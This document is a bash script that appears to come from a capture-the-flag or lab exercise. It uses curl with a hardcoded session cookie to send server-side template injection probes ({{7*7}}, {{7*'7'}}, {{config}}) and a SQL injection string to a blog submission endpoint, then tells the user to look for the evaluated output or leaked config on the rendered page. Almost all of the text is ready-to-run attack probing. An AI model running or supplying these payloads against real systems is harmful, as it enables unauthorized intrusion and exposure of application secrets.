#!/bin/bash
     
     TARGET="http://10.129.16.238/api/submit_blog"
     COOKIE="session=.eJwtyz0KgDAMBtC7fHNxcMzkTSS06Q-mLaR2Eu-ugsvb3oU9mowMiqxDHKRyURAy-2P7EFt8r3AoAbQ6aE9J
   Qmmg0-Yb5hBrXOU_uB-WnBvi.aUJATg.eF_Li1r3sl5-m9egMx3-ApqaAp0"
     
     echo "[*] Testing blog API endpoint..."
     
     # Test 1: SSTI Math
     echo "[*] Test 1: SSTI {{7*7}}"
     curl -X POST "$TARGET" \
       -H "Cookie: $COOKIE" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "message={{7*7}}" \
       -s -o /dev/null
     sleep 1
     
     # Test 2: SSTI Python
     echo "[*] Test 2: SSTI {{7*'7'}}"
     curl -X POST "$TARGET" \
       -H "Cookie: $COOKIE" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "message={{7*'7'}}" \
       -s -o /dev/null
     sleep 1
     
     # Test 3: SSTI Config
     echo "[*] Test 3: SSTI {{config}}"
     curl -X POST "$TARGET" \
       -H "Cookie: $COOKIE" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "message={{config}}" \
       -s -o /dev/null
     sleep 1
     
     # Test 4: SQLi
     echo "[*] Test 4: SQL Injection"
     curl -X POST "$TARGET" \
       -H "Cookie: $COOKIE" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "message=test' OR '1'='1" \
       -s -o /dev/null
     
     echo ""
     echo "[*] Done! Now check http://10.129.16.238/blog/1 in your browser"
     echo "[*] Look for: 49, 7777777, or config details"
